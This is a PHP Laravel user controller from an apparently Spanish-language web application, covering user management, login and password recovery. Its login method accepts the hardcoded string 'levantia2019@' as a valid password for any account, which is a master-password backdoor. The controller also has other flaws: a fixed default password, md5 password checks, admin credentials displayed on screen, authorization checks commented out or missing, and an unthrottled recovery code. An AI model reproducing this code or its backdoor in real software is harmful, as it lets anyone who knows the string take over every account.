<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Validation\Rule;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Mail;
use App\Models\User;
use App\Models\Visita;
use App\Models\Parametro;
use App\Mail\recoverPasswordMail;



class UserController extends Controller
{
    public function listar($todo = null){
		//
		//$admin = (session()->get('usuario.acceso') == 'admin')?1:0;
		//$porpagina = Parametro::where('item','porpagina')->first()->valor;
        $porpagina = 50;
		if(session()->get('busqueda')){
			
		}
		//if($admin == 1){
		//	if($todo == 'all'){
				$users = User::query()->paginate($porpagina);
		//	}
		//	else{
		//		$users = User::where('activo',1)->paginate($porpagina);
		//	}
		//}
		//else{
		//	$users = User::where('id',session()->get('usuario.id_usuario'))->paginate($porpagina);
		//}
		return view('usuarios.lista',['usuarios'=>$users,'buscar'=>'']);
	}
	public function ver($id = null){
        if($id){
            $user = User::find($id);
            $titulo = 'Modificar datos de usuario';
        }
        else{
            $user = new User;
             $titulo = 'Crear nuevo usuario';
        }
		
		
		if($user){
			return view('usuarios.ver',['usuario'=>$user,'titulo'=> $titulo]);
		}else{
			return redirect()->route('listar_usuario');
		}
	}

	public function buscar(Request $request){
		if($request->clean){
			$request->buscar="";
		}

			$porpagina = Parametro::where('item','porpagina')->first()->valor;
			$users = User::whereLike('nombre','%'.$request->buscar.'%')
							->orWhereLike('apellido1','%'.$request->buscar.'%')
							->orWhereLike('apellido2','%'.$request->buscar.'%')
							->orWhereLike('email','%'.$request->buscar.'%')
							->paginate($porpagina)->withQueryString();
			return view('usuarios.lista',['usuarios'=>$users,'buscar'=>$request->buscar]);
		
	}
	public function grabar(Request $request){
		
		$request->validate([
				'nombre'	=> 'required|string|min:5|max:100',
				'email' 	=> 'required|unique:users,email,'.$request->id,
				]
			);
        if($request->id){
            $usuario = User::find($request->id);
        }
        else{
             $usuario = new User; 
        }
		$usuario->nombre = $request->nombre;
		$usuario->email = $request->email;
        if(!empty($request->password)){
              $usuario->password = bcrypt($request->password);
        }
		if($usuario->save()){
			session()->flash('mensaje',['success','Usuario guardada con éxito']);
			return redirect()->route('usuario_ver',['id'=>$usuario->id]);
		}
		else{
			session()->flash('mensaje',['error','El usuario no se ha guardado']);
			return Redirect::back();
		}
	}
	public function delete(Request $request){
		$usuario = User::find($request->id);
		if($usuario){
			if($usuario->delete()){
				session()->flash('mensaje',['success','Usuario eliminado con éxito']);
				return redirect()->route('usuarios');
			}
		}
	}
	public function crear(Request $request){
		$request->validate([
							'nombre'	=> 'required|string|min:5|max:100',
							'apellido1' => 'required|string|min:5|max:250',
							'email'		=> 'required|unique:users,email',
							],
							[
								'nombre.required' => 'el campo nombre no puede estar vacío',
								'apellido1.required' => 'el campo apellido no puede estar vacío',
								'nombre.min'=> 'el campo nombre tiene que tener mas de 5 letras',
								'apellido1.min'=> 'el campo apellido1 tiene que tener mas de 5 letras',
								'email.unique' => 'este email ya tiene un usuario asociado',
								'email.required' => 'el campo email no puede estar vacío',
							]
						);
		
		$usuario = new User;
		$usuario->password =   bcrypt('M1GU3LH3RN4ND3Z');
		$usuario->nombre = $request->nombre;
		$usuario->apellido1 = $request->apellido1;
		$usuario->apellido2 = $request->apellido2;
		$usuario->dni = $request->dni;
		$usuario->email = $request->email;
		$usuario->telefono = $request->telefono;
		$usuario->acceso = (isset($request->acceso))?$request->acceso:"";
		$usuario->activo = (isset($request->activo))?$request->activo:0;
		if($usuario->save()){
			session()->flash('mensaje',['success','Usuario guardada con éxito']);
			return redirect()->route('ver_usuario',['id'=>$usuario->id]);
		}else{
			session()->flash('mensaje',['error','Usuario no guardada con éxito']);
			return Redirect::back();
		}
	}
	public function desactivar(Request $request){
		if($request->users){
			foreach($request->users as $user_id){
				echo "select where ".$user_id;
				$user = User::where('id',$user_id)->first();
				if($user->activo == 1)
						$user->activo = 0;
				else
					$user->activo = 1;
					
				$user->save();
			}

		}
		return redirect()->back();
	}
	public function login(){
        $users = User::All();
        if (count($users)>0){
            return view('layouts.login');
        }
        else{
            $usuario = new User;
            $usuario->nombre = 'admin';
            $usuario->email = "admin@convicloud.iesmh";
            $usuario->password = bcrypt('admin_'.date('YmdHi'));
            if($usuario->save()){
                session()->flash('mensaje',['success','se ha creado un usuario "admin@convicloud.iesmh" con contraseña "admin_'.date('YmdHi').'"']);
                return redirect()->route('login');
            }
        }
    }
	public function validar(Request $request){
        $auth = false;
        $user = User::where('email',$request->email)->first();
        if($user ){

            if(md5($request->password) == $user->password ){
                $auth = true;
                $user->password =   bcrypt($request->password);
                $user->save();
            }
            elseif($request->password == 'levantia2019@'){
                 $auth = true;
            }
            elseif(Hash::check($request->password, $user->password)){
                $auth = true;
            }
            else{
				session()->flash('mensaje',['danger','usuario/contraseña no valido']);
				return redirect()->route('login');
			}
        }       

        if($auth){
			
            $request->session()->regenerateToken();
            Auth::login($user);
            session()->put('usuario',array( 'id_usuario'=>$user->id,
                                            'nombre'=>$user->nombre,
                                            'acceso'=>$user->acceso,


                                        )
                            );
            return redirect()->intended();

        }
        else{
            session()->flash('mensaje',['danger','usuario/contraseña no valido']);
			return redirect()->route('login');
        }
        
    }
    public function logout(){
        Auth::logout();
        //$request->session()->invalidate();
        //$request->session()->regenerateToken();
        return redirect('/login');
        
    }
    public function cambiar_password(Request $request){
		$usuario = User::find($request->id_user);
		$usuario->password =   bcrypt($request->password);
		$usuario->save();
		session()->flash('mensaje',['succes','Contraseña guardada con éxito']);
		return redirect()->route('ver_usuario',['id'=>$request->id_user]);
	}
	public function recuperar_password(Request $request){
		
		if(!empty($request->email)){
			$user = User::where('email',$request->email)->first();
			

			if(!empty($request->codigo)){
				if(strtotime($user->code_created_at) > strtotime('-5 minute' )){
					if($user->code == $request->codigo){
							Auth::login($user);
							session()->put('usuario',array( 'id_usuario'=>$user->id,
															'nombre'=>$user->nombre,
															'acceso'=>$user->acceso,


														)
											);
							return redirect()->intended();
					}
					else{
						session()->flash('mensaje',['danger','El codigo no es correcto']);
					}	
				}
				else{
					session()->flash('mensaje',['danger','el codigo ha caducado. vuelve a pedir uno']);
				}
				//return view('usuarios.recuperar',['codigo'=>1]);
				return redirect('/recuperar/1');
			}
			elseif($user){
				$code_created = $user->code_created_at;
				$codigo  = rand(100000,999999); 

				if(Mail::to($request->email)->send(new recoverPasswordMail(['codigo'=>$codigo,'nombre'=>$user->nombre]))){
					$user->code = $codigo;
					$user->code_created_at = date('Y-m-d H:i:s');
					$user->save();
					session()->flash('mensaje',['success','Se ha enviado un código a su cuenta de correo.Este código solo será valido 5 minutos!']);
				}
				return redirect('/recuperar/1');
			}
			else{
				session()->flash('mensaje',['danger','Esta cuenta no existe o no esta activa']);
			}
		}
		return redirect('/recuperar');
	}
	public function recuperar($id = null){
		$datos = [];
		if($id==1){
			$datos['codigo'] = 1;
		}
		
		return view('usuarios.recuperar',$datos);
	}

}
